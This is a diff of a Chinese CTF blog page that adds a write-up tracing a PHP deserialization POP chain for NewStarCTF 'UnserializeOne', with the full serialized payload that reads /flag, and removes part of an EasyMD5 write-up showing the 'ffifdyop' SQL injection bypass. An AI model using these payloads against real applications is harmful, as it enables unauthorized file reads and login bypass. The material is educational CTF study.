@@ -3259,6 +3259,241 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-03 19:05:00+00:00">2026-11-03</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="category/php/" class="md-meta__link">PHP</a>, 
+              <a href="category/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-meta__link">反序列化</a>, 
+              <a href="category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="md-meta__link">代码审计</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="newstarctf-unserializeone"><a class="toclink" href="newstarctf-unserializeone/">[NewStarCTF] UnserializeOne — 五个魔术方法串成一条链</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：PHP 反序列化 — POP 链构造（魔术方法连环触发）</p>
+<p><strong>Flag</strong>：<code>CTF2{a3ae15bd-2047-4dd5-b9b3-c0dccb22c632}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="newstarctf-unserializeone/#_1">题目概述</a></h3>
+<p>给一份源码，入口就一句：</p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">if(isset($_POST['pop'])){</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">    unserialize($_POST['pop']);</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>四个类：<code>Start</code>、<code>Sec</code>、<code>Easy</code>、<code>eeee</code>，各带魔术方法。任务是拼一条从 <code>unserialize</code> 走到 <code>file_get_contents('/flag')</code> 的链。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="newstarctf-unserializeone/#_2">解题过程</a></h3>
+<h4 id="step-1flag"><a class="toclink" href="newstarctf-unserializeone/#step-1flag">Step 1：先找终点——flag 在哪被读出来</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">class Sec{</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">    public function __invoke()</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="x">    {</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="x">        echo file_get_contents('/flag');</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="x">    }</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>终点在 <code>Sec::__invoke()</code>。</strong></p>
+<p><strong><code>__invoke</code> 的触发条件：</strong>把一个对象当成函数来调用<strong>，也就是 <code>$obj()</code>。</strong></p>
+<h4 id="step-2"><a class="toclink" href="newstarctf-unserializeone/#step-2">Step 2：谁会把对象当函数调用</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">class Start{</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">    public function __isset($var)</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="x">    {</span>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="x">        ($this-&gt;func)();</span>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="x">    }</span>
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>($this-&gt;func)()</code> —— 这就是“把 <code>$this-&gt;func</code> 当函数调用”。只要 <code>$this-&gt;func</code> 是一个 <code>Sec</code> 对象，就会走到 <code>Sec::__invoke</code>。</strong></p>
+<p><strong>所以现在要找：</strong><code>__isset</code> 怎么被触发<strong>。</strong></p>
+<p><strong><code>__isset</code> 的触发条件：</strong>对不可访问或不存在的属性调用 <code>isset()</code>（或 <code>empty()</code>）<strong>。</strong></p>
+<h4 id="step-3-isset"><a class="toclink" href="newstarctf-unserializeone/#step-3-isset">Step 3：谁会对不存在的属性调用 isset</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">class eeee{</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    public $obj;</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">    public function __clone()</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="x">    {</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="x">        if(isset($this-&gt;obj-&gt;cmd)){</span>
+</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="x">            echo "success";</span>
+</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="x">        }</span>
+</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="x">    }</span>
+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>isset($this-&gt;obj-&gt;cmd)</code> —— 如果 <code>$this-&gt;obj</code> 是个 <code>Start</code> 对象，而 <code>Start</code> 里没有 <code>cmd</code> 这个属性，</strong>这就是“对不存在的属性调用 isset”<strong>，正好触发 <code>Start::__isset</code>。</strong></p>
+<p><strong>所以 <code>eeee-&gt;obj</code> 要指向一个 <code>Start</code>，而那个 Start 的 <code>func</code> 要指向一个 <code>Sec</code>。</strong></p>
+<p><strong>下一个问题：<code>__clone</code> 怎么触发？</strong></p>
+<h4 id="step-4-clone"><a class="toclink" href="newstarctf-unserializeone/#step-4-clone">Step 4：谁在 clone 对象</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">class Easy{</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">    public $cla;</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="x">    public function __call($fun, $var)</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="x">    {</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="x">        $this-&gt;cla = clone $var[0];</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="x">    }</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>clone $var[0]</code> —— 直接触发被 clone 对象的 <code>__clone</code>。</strong></p>
+<p><strong><code>__call</code> 的触发条件：</strong>调用了对象上不存在的方法<strong>。</strong></p>
+<h4 id="step-5"><a class="toclink" href="newstarctf-unserializeone/#step-5">Step 5：谁调用了不存在的方法</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">class Sec{</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">    public function __toString()</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">    {</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="x">        $this-&gt;obj-&gt;check($this-&gt;var);</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="x">        return "CTFers";</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="x">    }</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong><code>$this-&gt;obj-&gt;check($this-&gt;var)</code> —— <code>check</code> 这个方法四个类里都没有，所以只要 <code>$this-&gt;obj</code> 是 <code>Easy</code>，就会触发 <code>Easy::__call</code>，</strong>而且第一个参数正好是 <code>$this-&gt;var</code><strong>（也就是我们要 clone 的那个 <code>eeee</code> 对象）。</strong></p>
+<p><strong><code>__toString</code> 的触发条件：</strong>对象被当成字符串使用<strong>。</strong></p>
+<h4 id="step-6"><a class="toclink" href="newstarctf-unserializeone/#step-6">Step 6：谁把对象当字符串用了</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="x">class Start{</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="x">    public function __destruct()</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="x">    {</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="x">        echo "Welcome to NewStarCTF, ".$this-&gt;name;</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="x">    }</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>字符串拼接 <code>"..." . $this-&gt;name</code> —— 如果 <code>$this-&gt;name</code> 是个 <code>Sec</code> 对象，就会触发 <code>Sec::__toString</code>。</strong></p>
+<p><strong>而 <code>__destruct</code> 是</strong>对象被销毁时自动调用<strong>——反序列化出来的对象在脚本结束时都会析构，所以这里是天然的起点。</strong></p>
+<hr />
+<h3 id="_3"><a class="toclink" href="newstarctf-unserializeone/#_3">完整链条</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>unserialize 结束、脚本运行完毕
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>  → Start::__destruct()            对象销毁自动触发
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>    → 字符串拼接 $this-&gt;name
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>      → Sec::__toString()          对象被当字符串用
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>        → $this-&gt;obj-&gt;check(...)   调用不存在的方法
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>          → Easy::__call()         不存在的方法被调用
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>            → clone $var[0]        克隆对象
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>              → eeee::__clone()    对象被 clone
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>                → isset($this-&gt;obj-&gt;cmd)   不存在的属性
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>                  → Start::__isset()       对不存在的属性 isset
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>                    → ($this-&gt;func)()      对象当函数调用
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>                      → Sec::__invoke()    对象当函数
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>                        → file_get_contents('/flag')
+</span></code></pre></div>
+<p><strong>五个魔术方法，一层扣一层，最后落在读文件上。</strong></p>
+<hr />
+<h3 id="payload"><a class="toclink" href="newstarctf-unserializeone/#payload">Payload</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>O:5:"Start":2:{
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>  s:4:"name";O:3:"Sec":2:{
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>    s:3:"var";O:4:"eeee":1:{
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>      s:3:"obj";O:5:"Start":2:{
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>        s:4:"name";N;
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>        s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>      }
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>    }
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>  }
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>  s:4:"func";N;
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>}
+</span></code></pre></div>
+<p><strong>压成一行：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}
+</span></code></pre></div>
+<p><strong>POST 参数名 <code>pop</code>，值就是上面那串。</strong></p>
+<h4 id="payload_1"><a class="toclink" href="newstarctf-unserializeone/#payload_1">这个 payload 的结构对照</a></h4>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>外层 Start
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>  name → Sec          ← __destruct 拼字符串时触发 __toString
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>    obj  → Easy       ← __toString 里调 check()，触发 __call
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>    var  → eeee       ← __call 里 clone 的第一个参数
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>             obj → Start   ← __clone 里 isset($obj-&gt;cmd)，触发 __isset
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>                     func → Sec   ← __isset 里 ($this-&gt;func)()，触发 __invoke
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>  func → N            ← 外层 Start 自己的 func，用不到，给 null 即可
+</span></code></pre></div>
+<hr />
+<h3 id="_4"><a class="toclink" href="newstarctf-unserializeone/#_4">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>从能读 flag 的地方倒推：
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>  file_get_contents  → Sec::__invoke
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>    ← 谁把对象当函数调用？  Start::__isset 的 ($this-&gt;func)()
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>      ← 谁触发 __isset？    eeee::__clone 的 isset($this-&gt;obj-&gt;cmd)
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>        ← 谁触发 __clone？  Easy::__call 的 clone $var[0]
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>          ← 谁触发 __call？ Sec::__toString 的 $this-&gt;obj-&gt;check()
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>            ← 谁触发 __toString？ Start::__destruct 的字符串拼接
+</span></code></pre></div>
+<p><strong>每一步都在问同一个问题：</strong>要走到下一步，得先满足什么条件？<strong>——然后去别的类里找满足这个条件的地方。</strong></p>
+<h4 id="_5"><a class="toclink" href="newstarctf-unserializeone/#_5">漏洞原理</a></h4>
+<p><strong>① 魔术方法 = 自动触发的“钩子”</strong></p>
+<p><strong>PHP 在很多操作上埋了钩子：对象销毁、被当字符串、被当函数、访问不存在的属性、调用不存在的方法、被 clone……开发者通常不知道这些钩子会在什么时候被调用。</strong></p>
+<p><strong>② 只要链上每一环的属性都可控，就能拼出一条执行路径</strong></p>
+<p><strong><code>unserialize</code> 允许攻击者指定属性的</strong>类型和内容<strong>——一个字符串可以变成对象、对象可以变成另一个类的对象。于是本来毫无关系的四个类，被拼成了一条完整的调用链。</strong></p>
+<p><strong>这就是 POP 链（Property-Oriented Programming）：</strong>不执行代码，只摆对象，让程序自己走过去。**</p>
+<p><strong>③ 最终的 sink 是 <code>file_get_contents('/flag')</code></strong></p>
+<p><strong>链子本身不做坏事，它只是把执行流送到那个能读文件的方法里。</strong></p>
+<h4 id="_6"><a class="toclink" href="newstarctf-unserializeone/#_6">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>魔术方法</th>
+<th>触发条件</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__destruct()</code></td>
+<td>对象被销毁（脚本结束时自动调用）</td>
+</tr>
+<tr>
+<td><code>__toString()</code></td>
+<td>对象被当成字符串使用（拼接、echo、比较）</td>
+</tr>
+<tr>
+<td><code>__call($name,$args)</code></td>
+<td>调用了<strong>不存在</strong>的方法</td>
+</tr>
+<tr>
+<td><code>__clone()</code></td>
+<td>对象被 <code>clone</code> 时</td>
+</tr>
+<tr>
+<td><code>__isset($name)</code></td>
+<td>对<strong>不存在/不可访问</strong>的属性调用 <code>isset()</code> 或 <code>empty()</code></td>
+</tr>
+<tr>
+<td><code>__invoke()</code></td>
+<td>对象被当成函数调用，如 <code>$obj()</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>属性可见性：protected / private 的写法不一样</summary>
+<p><strong>本题源码里四个类的属性在页面截图上都是 <code>public</code>，所以直接写属性名就行。</strong></p>
+<p><strong>但如果遇到 <code>protected</code> 或 <code>private</code>，序列化串里的名字要带前缀，而且</strong>长度要把前缀算进去<strong>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>public     s:4:"name";          直接写名字
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0
+</span></code></pre></div>
+<p><strong>本地构造时要按目标类的真实可见性来写</strong>，否则反序列化出来的属性是“同名但不是同一个”，魔术方法里读到的会是你没设置的那个。</p>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 起点不要从某个类硬找</strong></p>
+<p>这题的起点是 <code>__destruct</code>——它不需要任何操作就会触发，所以<strong>从“谁最先被自动调用”往回推，比从入口 <code>unserialize</code> 正着推更快</strong>。</p>
+<p><strong>② 把它当成“倒推题”而不是“写代码题”</strong></p>
+<p>链子上每一环的答案都藏在别的类里，<strong>不需要写新代码，只需要摆对象</strong>。</p>
+<p><strong>③ 本地搭一份再改</strong></p>
+<p>把四个类复制到本地 PHP 里，用 <code>serialize()</code> 生成基础串，再对着改属性——比自己手数括号可靠得多。</p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-03 18:30:00+00:00">2026-11-03</time></li>
         
           <li class="md-meta__item">
@@ -5464,247 +5699,6 @@
 </span><span id="__span-19-24"><a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a>    <span class="p">}</span>
 </span><span id="__span-19-25"><a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a><span class="p">}</span>
 </span><span id="__span-19-26"><a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a><span class="cp">?&gt;</span>
-</span></code></pre></div>
-</details>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-31 00:00:00+00:00">2026-10-31</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="category/php/" class="md-meta__link">PHP</a>, 
-              <a href="category/%E5%BC%B1%E7%B1%BB%E5%9E%8B/" class="md-meta__link">弱类型</a>, 
-              <a href="category/sql/" class="md-meta__link">SQL</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 3 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="easymd5"><a class="toclink" href="easy-md5/">EasyMD5 — 三种比较，三条绕过</a></h2>
-<blockquote>
-<p><strong>题目类型</strong>：Web — MD5 特性 / 弱类型 / SQL 注入</p>
-<p><strong>题目地址</strong>：BUUCTF EasyMD5（ctf2 复刻环境）</p>
-<p><strong>Flag</strong>：<code>CTF2{028c2bd1-33f7-401b-b299-1525fd86cf41}</code></p>
-</blockquote>
-<hr />
-<h3 id="_1"><a class="toclink" href="easy-md5/#_1">题目概述</a></h3>
-<p>刚进来就是一个查询页面，一个输入框加一个「提交查询」按钮，源码里什么也没有。</p>
-<p><img alt="查询页" src="../assets/images/easy-md5/01-index.png" /></p>
-<p><strong>后面还有两关，一共三层，每层考一种不同的绕过。</strong></p>
-<hr />
-<h3 id="_2"><a class="toclink" href="easy-md5/#_2">解题过程</a></h3>
-<h4 id="step-1"><a class="toclink" href="easy-md5/#step-1">Step 1：先是完全没头绪</a></h4>
-<p><strong>看着像查询框，先试各种 SQL 注入 —— 页面一点动静都没有。</strong></p>
-<p><strong>又用 dirsearch 扫了一下，还是没东西。</strong></p>
-<p><strong>最后抓包发出去，看</strong>响应头<strong>，发现了 hint。</strong></p>
-<h4 id="step-2hint"><a class="toclink" href="easy-md5/#step-2hint">Step 2：Hint 在响应头里</a></h4>
-<p><img alt="响应头里的 Hint" src="../assets/images/easy-md5/02-hint-header.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>Hint: select * from 'admin' where password=md5($pass, true)
-</span></code></pre></div>
-<p><strong>注意 <code>md5($pass, **true**)</code> 这个第二个参数。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>md5($s, false)  →  32 位十六进制字符串（平时用的那种）
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>md5($s, true)   →  16 字节的原始二进制
-</span></code></pre></div>
-<p><strong>平时我们见到的 <code>md5</code> 结果都是 32 个字符，那是因为默认把它编码成十六进制了。<code>true</code> 返回的是</strong>原始字节** —— 而这些字节里可以出现引号、反斜杠等特殊字符。**</p>
-<p><strong>也就是说：</strong>MD5 的结果可能污染 SQL 语句。**</p>
-<h4 id="step-3"><a class="toclink" href="easy-md5/#step-3">Step 3：构造一个永真式</a></h4>
-<p><strong>SQL 拼出来是：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="s1">'admin'</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">'&lt;md5 的原始字节&gt;'</span>
-</span></code></pre></div>
-<p><strong>如果 md5 的原始字节以 <code>'or'</code> 开头，就变成了：</strong></p>
-<div class="language-sql highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="k">where</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="s1">''</span><span class="k">or</span><span class="s1">'6...'</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">                </span><span class="err">└──┘</span><span class="w"> </span><span class="err">└────</span><span class="w"> </span><span class="err">非空字符串</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">真</span>
-</span></code></pre></div>
-<p><strong><code>'' or '任意非空字符串'</code> 恒为真 → 直接登录进去。</strong></p>
-<p><strong>本机验证：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">md5('ffifdyop', true)</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">= 276f722736c95d99e921722cf9ed621c</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="x">可打印形式： 'or'6.]..!r,..b.</span>
-</span></code></pre></div>
-<p><strong>所以第一关的答案就是 <code>ffifdyop</code>。</strong></p>
-<h4 id="step-4"><a class="toclink" href="easy-md5/#step-4">Step 4：第二关 —— 松散不等 + 弱相等</a></h4>
-<p><img alt="第二关源码" src="../assets/images/easy-md5/03-level2-source.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">$a = $_GET['a'];</span>
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="x">$b = $_GET['b'];</span>
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="x">if ($a != $b &amp;&amp; md5($a) == md5($b)) {</span>
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="x">    // wow, glzjin wants a girl friend.</span>
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong>两个条件：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>$a != $b          松散不等（数组、'1' 和 1 都算相等）
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>md5($a) == md5($b) 松散相等
-</span></code></pre></div>
